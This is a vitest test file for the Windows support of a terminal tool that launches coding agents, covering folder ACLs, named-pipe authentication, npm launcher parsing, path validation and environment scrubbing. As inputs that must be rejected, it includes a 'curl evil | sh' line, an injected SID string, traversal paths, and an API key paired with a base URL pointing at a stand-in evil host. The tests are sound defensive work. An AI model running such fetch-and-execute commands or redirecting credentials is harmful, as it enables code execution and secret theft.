import { afterEach, expect, it } from 'vitest';
import { chmod, mkdir, mkdtemp, realpath, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { ownedByMe, privateMode } from '../src/shared/owner.js';
import { isSafeAbsolutePath } from '../src/shared/validate.js';
import { aclArgs, ownerScript, parseWhoamiSid, parseAcl } from '../src/shared/win-acl.js';
import { pipeName, isPipeName } from '../src/shared/pipe.js';
import { parseNpmShim, windowsCommand, CliLaunchError } from '../src/daemon/win-launch.js';
import { killTreeArgs } from '../src/shared/kill-tree.js';
import { gitExecutable, nullDevice } from '../src/daemon/git-path.js';
import { findGitBash } from '../src/agent/win-bash.js';
import { keychainUnavailable } from '../src/daemon/keys.js';
import { agentSandbox } from '../src/daemon/agent-sandbox.js';

const WIN = process.platform === 'win32', roots: string[] = [];
afterEach(async () => { for (const root of roots.splice(0)) await rm(root, { recursive: true, force: true }); });
async function temp(): Promise<string> { const dir = await realpath(await mkdtemp(join(tmpdir(), 'ai-win-'))); roots.push(dir); return dir; }

it('owner and mode checks: POSIX uid and 0600 as before; on Windows the folder ACL is the check, not stat', () => {
  expect(ownedByMe({ uid: 501 }, 'darwin', 501)).toBe(true);
  expect(ownedByMe({ uid: 0 }, 'darwin', 501)).toBe(false);
  expect(ownedByMe({ uid: 0 }, 'win32', undefined)).toBe(true);
  expect(privateMode({ mode: 0o100600 }, 'linux')).toBe(true);
  expect(privateMode({ mode: 0o100644 }, 'linux')).toBe(false);
  expect(privateMode({ mode: 0o100666 }, 'win32')).toBe(true);
});

it('paths: Windows drive paths with spaces and non-ASCII names are fine; device paths, .. and control characters are not', () => {
  expect(isSafeAbsolutePath('C:\\Users\\Ünï Côdé\\my project', 'win32')).toBe(true);
  for (const bad of ['\\\\?\\C:\\x', '\\\\.\\pipe\\x', 'C:\\a\\..\\b', 'relative\\x', 'C:x', 'C:\\a\u0007b']) expect(isSafeAbsolutePath(bad, 'win32'), bad).toBe(false);
  expect(isSafeAbsolutePath('/Users/me/a b', 'darwin')).toBe(true);
});

it('ACL: icacls removes inherited entries and grants only your SID full control; the owner and entries are read back by SID', () => {
  expect(parseWhoamiSid('"desktop\\me","S-1-5-21-1-2-3-1001"\r\n')).toBe('S-1-5-21-1-2-3-1001');
  expect(parseWhoamiSid('garbage')).toBeNull();
  expect(aclArgs('C:\\Users\\me\\.ai-term', 'S-1-5-21-1-2-3-1001')).toEqual(['C:\\Users\\me\\.ai-term', '/inheritance:r', '/grant:r', '*S-1-5-21-1-2-3-1001:(OI)(CI)F', '/q']);
  expect(() => aclArgs('C:\\x', 'S-1-5-21-1-2-3-1001)(evil')).toThrow();
  expect(ownerScript).not.toMatch(/\$args|AITERM_ACL_PATH\s*=/);
  expect(parseAcl('S-1-5-21-1-2-3-1001\nS-1-5-21-1-2-3-1001\n')).toEqual({ owner: 'S-1-5-21-1-2-3-1001', entries: ['S-1-5-21-1-2-3-1001'] });
});

it('named pipe: a per-user name with a fresh random part, checked on both sides', () => {
  const name = pipeName('S-1-5-21-1-2-3-1001', 'C:\\Users\\me\\.ai-term', 'a'.repeat(32));
  expect(name).toMatch(/^\\\\\.\\pipe\\ai-term-[0-9a-f]{16}-a{32}$/);
  expect(isPipeName(name)).toBe(true);
  expect(isPipeName('\\\\.\\pipe\\other')).toBe(false);
  expect(isPipeName('\\\\server\\pipe\\ai-term-0000000000000000-' + 'a'.repeat(32))).toBe(false);
});

const SHIM = '@ECHO off\r\nGOTO start\r\n:find_dp0\r\nSET dp0=%~dp0\r\nEXIT /b\r\n:start\r\nSETLOCAL\r\nCALL :find_dp0\r\n\r\nIF EXIST "%dp0%\\node.exe" (\r\n  SET "_prog=%dp0%\\node.exe"\r\n) ELSE (\r\n  SET "_prog=node"\r\n  SET PATHEXT=%PATHEXT:;.JS;=;%\r\n)\r\n\r\nendLocal & goto #_undefined_# 2>NUL || title %COMSPEC% & "%_prog%"  "%dp0%\\node_modules\\@anthropic-ai\\claude-code\\cli.js" %*\r\n';
it('Claude Code and Codex on Windows: an npm .cmd launcher is read and its script run by node with the arguments as an array; cmd.exe never sees them', () => {
  expect(parseNpmShim(SHIM, 'C:\\npm')).toBe('C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js');
  expect(parseNpmShim(SHIM.replace('node_modules\\@anthropic-ai', '..\\..\\evil'), 'C:\\npm')).toBeNull();
  expect(parseNpmShim('@echo off\r\ncurl evil | sh\r\n', 'C:\\npm')).toBeNull();
  const recipe = windowsCommand({ executable: 'C:\\npm\\claude.cmd', args: ['--model=sonnet', 'fix "this" & that %PATH%'] }, { shim: SHIM, node: 'C:\\nodejs\\node.exe', script: true });
  expect(recipe).toEqual({ executable: 'C:\\nodejs\\node.exe', args: ['C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js', '--model=sonnet', 'fix "this" & that %PATH%'] });
  expect(windowsCommand({ executable: 'C:\\Users\\me\\.local\\bin\\claude.exe', args: ['x'] }, { shim: null, node: null, script: false })).toEqual({ executable: 'C:\\Users\\me\\.local\\bin\\claude.exe', args: ['x'] });
  expect(() => windowsCommand({ executable: 'C:\\npm\\claude.cmd', args: ['x'] }, { shim: '@echo off\r\nrem custom\r\n', node: 'C:\\nodejs\\node.exe', script: false })).toThrow(CliLaunchError);
});

it('stopping a process tree: taskkill /T /F on Windows, by number only', () => {
  expect(killTreeArgs(1234)).toEqual(['/T', '/F', '/PID', '1234']);
  expect(() => killTreeArgs(-1)).toThrow();
});

it('git on Windows: git.exe and NUL; elsewhere /usr/bin/git and /dev/null', async () => {
  expect(nullDevice('win32')).toBe('NUL'); expect(nullDevice('linux')).toBe('/dev/null');
  expect(gitExecutable('darwin')).toBe('/usr/bin/git');
});

it('bash on Windows uses Git for Windows\' bash.exe, never WSL\'s', async () => {
  const dir = await temp(); await mkdir(join(dir, 'Git', 'cmd'), { recursive: true }); await mkdir(join(dir, 'Git', 'bin'), { recursive: true });
  await writeFile(join(dir, 'Git', 'bin', 'bash.exe'), '');
  expect(await findGitBash(join(dir, 'Git', 'cmd', 'git.exe'), [])).toBe(join(dir, 'Git', 'bin', 'bash.exe'));
  expect(await findGitBash(null, ['C:\\Windows\\System32\\bash.exe'])).toBeNull();
});

it('Windows: Credential Manager line; Ask only', async () => {
  expect(keychainUnavailable('win32')).toBe('Windows Credential Manager unavailable');
  expect((await agentSandbox('win32')).dontAsk).toBe(false);
});

it('CLI lookup on Windows: claude.exe before claude.cmd, both found by their extension on PATH', async () => {
  const { resolveExecutable } = await import('../src/daemon/engines.js');
  const dir = await temp(), a = join(dir, 'a'), b = join(dir, 'b'); await mkdir(a); await mkdir(b);
  await writeFile(join(a, 'claude.cmd'), SHIM); await writeFile(join(b, 'claude.exe'), ''); await chmod(join(a, 'claude.cmd'), 0o755); await chmod(join(b, 'claude.exe'), 0o755);
  expect(await resolveExecutable('claude', [a, b].join(WIN ? ';' : ':'), 'win32')).toBe(join(a, 'claude.cmd'));
  expect(await resolveExecutable('claude', b, 'win32')).toBe(join(b, 'claude.exe'));
});

it('the pipe answers only a client holding the token from the folder only you can read', async () => {
  const { helloAllowed } = await import('../src/daemon/pipe-server.js');
  const token = 'f'.repeat(64);
  expect(helloAllowed(token, token)).toBe(true);
  expect(helloAllowed('e'.repeat(64), token)).toBe(false);
  expect(helloAllowed(undefined, token)).toBe(false);
  expect(helloAllowed('short', token)).toBe(false);
  expect(helloAllowed(undefined, null)).toBe(true);
});

it('a shell session on Windows is PowerShell, started with no arguments', async () => {
  const { windowsShell } = await import('../src/daemon/win-launch.js');
  expect(windowsShell({ SystemRoot: 'C:\\Windows' }, () => false)).toBe('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe');
});

it('system stats on Windows: CPU and memory from the OS, no network or per-agent numbers, no commands run', async () => {
  const { SystemSampler } = await import('../src/daemon/sysstats.js');
  const runs: string[] = [];
  let tick = 0;
  const sampler = new SystemSampler({ run: async file => { runs.push(file); return ''; }, cpus: () => [{ model: 'x', speed: 1, times: { user: 100 + tick * 10, nice: 0, sys: 0, idle: 100 + tick * 10, irq: 0 } }], totalmem: () => 1000, freemem: () => 400, now: () => (tick++) * 1000, sessions: () => [], log: { info: () => {}, error: () => {} }, platform: 'win32' }, 10);
  const stats = new Promise(resolve => sampler.once('stats', resolve));
  sampler.setSubscribers(1);
  expect(await stats).toMatchObject({ memUsedBytes: 600, memTotalBytes: 1000, netRxBytesPerSec: 0, netTxBytesPerSec: 0, sessions: [] });
  sampler.setSubscribers(0);
  expect(runs).toEqual([]);
});

it.skipIf(!WIN)('Windows: the AI Term folder is yours alone (ACL), the daemon answers on its pipe, and a path with spaces and non-ASCII works', async () => {
  const { getPaths, preparePaths } = await import('../src/shared/paths.js');
  const { checkMine } = await import('../src/shared/win-acl.js');
  const dir = await temp(), root = join(dir, 'Ünï côdé', '.ai-term'); await mkdir(join(dir, 'Ünï côdé'));
  const paths = getPaths(root); await preparePaths(paths, { daemon: true });
  expect(await checkMine(root)).toBe(true);
  // The daemon on its pipe: the client shows the token, the daemon proves it, a request goes through; then a graceful stop.
  const { SessionManager } = await import('../src/daemon/session-manager.js');
  const { DaemonServer } = await import('../src/daemon/server.js');
  const { Logger } = await import('../src/daemon/log.js');
  const { Connection } = await import('../src/client/connection.js');
  const manager = new SessionManager(paths, new Logger(paths.log)); await manager.load();
  const server = new DaemonServer(paths, manager, new Logger(paths.log)); await server.listen();
  try {
    const connection = await Connection.connect(paths, { entry: join(process.cwd(), 'src', 'cli', 'index.ts'), autoStart: false });
    try { expect((await connection.request({ kind: 'settings.get' })).settings).toBeTruthy(); } finally { connection.close(); }
  } finally { await server.close(); await manager.shutdown(); }
}, 120_000);

it('env on Windows: Path is spelled PATH in a copy; a credential variable goes whatever its case', async () => {
  const { buildShellEnv, buildSpawnEnv } = await import('../src/daemon/env.js');
  expect(buildShellEnv({ Path: 'C:\\Windows' }, { platform: 'win32' }).PATH).toBe('C:\\Windows');
  const env = buildSpawnEnv('claude-code', { kind: 'account' }, { Path: 'C:\\x', anthropic_api_key: 'sk-ant-x', Anthropic_Base_Url: 'http://evil' }, { platform: 'win32' });
  expect(env.anthropic_api_key).toBeUndefined(); expect(env.Anthropic_Base_Url).toBeUndefined(); expect(env.PATH).toBe('C:\\x');
});

// Part C review (typescript-reviewer, security-reviewer; fresh context): each failed before its fix.
it('HIGH (TS review): Git for Windows prints C:/… paths: they are accepted; agent folders follow the same rule', async () => {
  const { isAgentFolder } = await import('../src/shared/validate.js');
  expect(isSafeAbsolutePath('C:/Users/me/repo', 'win32')).toBe(true);
  expect(isSafeAbsolutePath('C:/Users/me/../x', 'win32')).toBe(false);
  expect(isAgentFolder('C:\\a\\..\\b', 'win32')).toBe(false);
  expect(isAgentFolder('C:\\Users\\me\\proj', 'win32')).toBe(true);
});

it('HIGH (TS review): a live daemon that hasn\'t opened its pipe yet is starting, not stale; a slow Windows start gets more than 3 s', async () => {
  const { lockState } = await import('../src/daemon/lock.js');
  expect(lockState({ alive: true, pipeAnswers: false, lockAgeMs: 5_000 })).toBe('running');
  expect(lockState({ alive: true, pipeAnswers: false, lockAgeMs: 60_000 })).toBe('stale');
  expect(lockState({ alive: true, pipeAnswers: true, lockAgeMs: 60_000 })).toBe('running');
  expect(lockState({ alive: false, pipeAnswers: false, lockAgeMs: 1 })).toBe('stale');
  const { daemonStartDeadline } = await import('../src/client/connection.js');
  expect(daemonStartDeadline('win32')).toBeGreaterThanOrEqual(15_000); expect(daemonStartDeadline('darwin')).toBe(3000);
});

it('HIGH (TS review): an Administrators-owned folder (an elevated terminal) is accepted when every entry is yours; any other entry is not', async () => {
  const { aclIsMine } = await import('../src/shared/win-acl.js');
  const me = 'S-1-5-21-1-2-3-1001';
  expect(aclIsMine(parseAcl(`S-1-5-32-544\n${me}\n`), me)).toBe(true);
  expect(aclIsMine(parseAcl(`${me}\n${me}\nS-1-5-21-1-2-3-1002\n`), me)).toBe(false);
  expect(aclIsMine(parseAcl('S-1-5-21-1-2-3-1002\n' + me + '\n'), me)).toBe(false);
});

it('HIGH (TS review): the folder is checked by the daemon; a client only makes it (icacls) when it creates it', async () => {
  const { aclPlan } = await import('../src/shared/paths.js');
  expect(aclPlan({ created: true, daemon: false })).toBe('restrict');
  expect(aclPlan({ created: false, daemon: false })).toBe('none');
  expect(aclPlan({ created: false, daemon: true })).toBe('verify');
  expect(aclPlan({ created: true, daemon: true })).toBe('verify');
});

it('HIGH (TS review): AI Term\'s agent on Windows keeps SystemRoot, TEMP and USERPROFILE; git gets SystemRoot; tests get ProgramFiles', async () => {
  const { buildAgentEnv, buildTestEnv, windowsBaseVars } = await import('../src/daemon/env.js');
  expect(windowsBaseVars('win32')).toEqual(expect.arrayContaining(['SystemRoot', 'TEMP', 'USERPROFILE', 'ProgramFiles', 'ProgramData', 'NUMBER_OF_PROCESSORS']));
  expect(windowsBaseVars('darwin')).toEqual([]);
  if (WIN) {
    const env = buildAgentEnv(process.env, { secret: 'sk-ant' + '-test0123456789abcdef', endpoint: null, entry: 'C:\\ai\\dist\\cli\\index.js' });
    expect(env.SystemRoot ?? env.SYSTEMROOT).toBeTruthy();
    expect(buildTestEnv(process.env).ProgramFiles).toBeTruthy();
  }
});

it('MEDIUM (TS review): a .bat or a non-npm .cmd is refused; a launcher whose npm package is a native .exe runs that .exe; an unreadable launcher says so', async () => {
  expect(() => windowsCommand({ executable: 'C:\\x\\gradlew.bat', args: [] }, { shim: null, node: null, script: false })).toThrow(CliLaunchError);
  const exeShim = '@ECHO off\r\nGOTO start\r\n:find_dp0\r\nSET dp0=%~dp0\r\nEXIT /b\r\n:start\r\nSETLOCAL\r\nCALL :find_dp0\r\n"%dp0%\\node_modules\\@openai\\codex\\bin\\codex.exe"   %*\r\n';
  expect(windowsCommand({ executable: 'C:\\npm\\codex.cmd', args: ['--x'] }, { shim: exeShim, node: null, script: true })).toEqual({ executable: 'C:\\npm\\node_modules\\@openai\\codex\\bin\\codex.exe', args: ['--x'] });
  const { launchFacts } = await import('../src/daemon/win-launch.js');
  const dir = await temp(); await mkdir(join(dir, 'locked.cmd'));
  await expect(launchFacts(join(dir, 'locked.cmd'), '')).rejects.toThrow("AI Term couldn't read this CLI's .cmd launcher");
});

it('MEDIUM (TS review): without Git for Windows there is no git (never a bare git.exe found in the folder)', () => {
  expect(gitExecutable('win32', 'C:\\nowhere', [])).toBeNull();
});

it('MEDIUM (TS review): worktree checks on Windows ignore case and slash style', async () => {
  const { pathInside } = await import('../src/shared/path-inside.js');
  expect(pathInside('C:\\Users\\Me\\.ai-term\\worktrees', 'c:/users/me/.ai-term/worktrees/r/a', 'win32')).toBe(true);
  expect(pathInside('C:\\Users\\Me\\.ai-term\\worktrees', 'C:\\Users\\Me\\.ai-term\\worktrees2', 'win32')).toBe(false);
  expect(pathInside('/Users/me/w', '/Users/me/W/x', 'darwin')).toBe(false);
});

it('MEDIUM (TS review): a failed stop on Windows is reported; killGroup takes its error handler', async () => {
  const text = await (await import('node:fs/promises')).readFile(join(process.cwd(), 'src', 'shared', 'kill-tree.ts'), 'utf8');
  expect(text).not.toContain('onError: (error: unknown) => void = () => {}');
  const host = await (await import('node:fs/promises')).readFile(join(process.cwd(), 'src', 'daemon', 'pty-host.ts'), 'utf8');
  expect(host).toContain("this.stopFailed?'Session stop signal failed'");
});

it('HIGH (security review): the client checks the daemon answers with proof of the token (HMAC of its nonce) before sending anything else', async () => {
  const { helloProof, proofValid } = await import('../src/daemon/pipe-server.js');
  const token = 'a'.repeat(64), nonce = 'b'.repeat(64);
  const proof = helloProof(token, nonce);
  expect(proof).toMatch(/^[0-9a-f]{64}$/);
  expect(proofValid(token, nonce, proof)).toBe(true);
  expect(proofValid(token, nonce, helloProof('c'.repeat(64), nonce))).toBe(false);
  expect(proofValid(token, nonce, undefined)).toBe(false);
  const { validateRequest, validateSuccess } = await import('../src/shared/validate.js');
  const id = '11111111-1111-4111-8111-111111111111';
  await expect(validateRequest({ id, kind: 'hello', protocol: 1, version: '1', token, nonce })).resolves.toMatchObject({ nonce });
  expect(validateSuccess({ id, ok: true, kind: 'hello', protocol: 1, version: '1', daemonPid: 5, proof })).toMatchObject({ proof });
  await expect(validateRequest({ id, kind: 'daemon.stop' })).resolves.toMatchObject({ kind: 'daemon.stop' });
});

it('HIGH (security review): a stale daemon.pipe is removed when its daemon is known dead, so nobody can sit on the old name', async () => {
  const { removeStalePipe, pipeFile } = await import('../src/daemon/pipe-server.js');
  const dir = await temp(), socket = join(dir, 'run', 'daemon.sock'); await mkdir(join(dir, 'run'));
  await writeFile(pipeFile(socket), JSON.stringify({ name: '\\\\.\\pipe\\ai-term-0123456789abcdef-' + 'a'.repeat(32), token: 'b'.repeat(64) }));
  await removeStalePipe(socket);
  await expect((await import('node:fs/promises')).stat(pipeFile(socket))).rejects.toThrow();
  await removeStalePipe(socket);
});

it('MEDIUM (security review): the folder and each of its folders are checked in one PowerShell run; LOW: alternate data streams and device names are refused', async () => {
  const { parseAcls } = await import('../src/shared/win-acl.js');
  const me = 'S-1-5-21-1-2-3-1001';
  expect(parseAcls(`#\n${me}\n${me}\n#\nS-1-5-21-9-9-9-500\n${me}\n`)).toEqual([{ owner: me, entries: [me] }, { owner: 'S-1-5-21-9-9-9-500', entries: [me] }]);
  for (const bad of ['C:\\x\\file.txt:stream', 'C:\\x\\NUL', 'C:\\x\\con.txt', 'C:\\COM1\\y']) expect(isSafeAbsolutePath(bad, 'win32'), bad).toBe(false);
});

// v0.8 gate, found by GitHub Actions on windows-latest and ubuntu-latest: each failed there before its fix.
it.skipIf(!WIN)('gate (CI, Windows): settings and keys can be saved (a folder can\'t be fsynced on Windows)', async () => {
  const { atomicWrite } = await import('../src/daemon/store.js');
  const dir = await temp();
  await atomicWrite(join(dir, 'settings.json'), { theme: 'graphite' });
  expect(JSON.parse(await (await import('node:fs/promises')).readFile(join(dir, 'settings.json'), 'utf8'))).toEqual({ theme: 'graphite' });
});

it('gate (CI, Windows): git lookup can be pointed at places with no git; the ACL tools get the env PowerShell needs', async () => {
  expect(gitExecutable('win32', 'C:\\nowhere', [])).toBeNull();
  const { aclToolEnv } = await import('../src/shared/win-acl.js');
  expect(aclToolEnv({ SystemRoot: 'C:\\Windows', TEMP: 'C:\\t', SECRET_TOKEN: 'x' })).toEqual({ SystemRoot: 'C:\\Windows', PATH: 'C:\\Windows\\System32', PSModulePath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules', TEMP: 'C:\\t' });
});

it.runIf(process.platform === 'linux' && process.env.CI === 'true')('gate (CI, Linux): bubblewrap works on the CI machine, so the real sandbox tests ran rather than skipped', async () => {
  const { agentSandbox } = await import('../src/daemon/agent-sandbox.js');
  expect(await agentSandbox('linux')).toEqual({ dontAsk: true });
});
